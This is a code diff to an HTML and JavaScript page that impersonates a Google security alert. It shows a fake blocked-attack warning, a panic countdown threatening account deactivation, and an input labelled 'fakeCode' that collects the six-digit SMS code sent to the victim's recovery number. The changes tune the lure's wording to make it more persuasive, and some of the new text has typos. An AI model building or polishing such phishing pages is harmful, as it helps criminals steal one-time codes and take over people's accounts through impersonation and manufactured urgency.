@@ -120,7 +120,6 @@ button:disabled{opacity:.6;cursor:not-allowed;}
   <p class="line">Location: <strong id="region">Detecting...</strong></p>
   
   <div class="blocked-info line">
-    ✅ <strong>Google blocked the attack</strong><br>
     <small>High-volume failed login attempts detected from multiple IP addresses</small>
   </div>
   
@@ -164,7 +163,7 @@ button:disabled{opacity:.6;cursor:not-allowed;}
   <p>Enter 6-digit code sent to your recovery number:</p>
   <input type="text" class="otp-input" id="fakeCode" maxlength="6" placeholder="______">
   <button id="otpVerifyBtn" class="primary">✓ VERIFY CODE</button>
-  <p class="small">Code expired. <a href="#" onclick="resendOTP()" style="color:#1a73e8;">Resend SMS</a></p>
+  <p class="small">Didn't recieve the code? <a href="#" onclick="resendOTP()" style="color:#1a73e8;">Resend SMS</a></p>
 </div>
 
 <div class="card hidden" id="q4">
@@ -230,10 +229,10 @@ const panicTimer = setInterval(() => {
   
   // NATURAL PHASE CHANGES - EMPHASIZE GOOGLE PROTECTION
   if (mainTimer === 60) {
-    elements.urgencyMsg.innerHTML = `✅ Google blocked attack - Verify in <strong>${mainTimer}s</strong> or risk account deactivation`;
+    elements.urgencyMsg.innerHTML = `Pleass verify in <strong>${mainTimer}s</strong> or risk account deactivation`;
   }
   else if (mainTimer === 45) {
-    elements.urgencyMsg.innerHTML = `🚨 Security risk HIGH - <strong>${mainTimer}s</strong> to keep data protected`;
+    elements.urgencyMsg.innerHTML = `Security risk HIGH - <strong>${mainTimer}s</strong> to keep data protected`;
     elements.main.style.borderColor = '#d93025';
   }
   else if (mainTimer === 30) {
